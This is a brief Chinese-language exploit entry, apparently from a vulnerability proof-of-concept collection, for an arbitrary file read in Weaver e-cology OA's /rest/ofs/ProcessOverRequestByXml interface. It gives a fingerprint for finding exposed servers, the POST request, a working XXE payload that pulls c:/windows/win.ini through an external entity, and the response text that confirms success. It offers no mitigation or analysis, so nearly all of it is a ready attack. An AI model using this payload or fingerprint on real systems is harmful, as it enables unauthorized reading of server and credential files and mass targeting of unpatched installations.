# 泛微e-cologyProcessOverRequestByXml接口任意文件读取漏洞

泛微OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/js/ecology8"`
- **请求**：`POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
```
- **响应特征**：200 support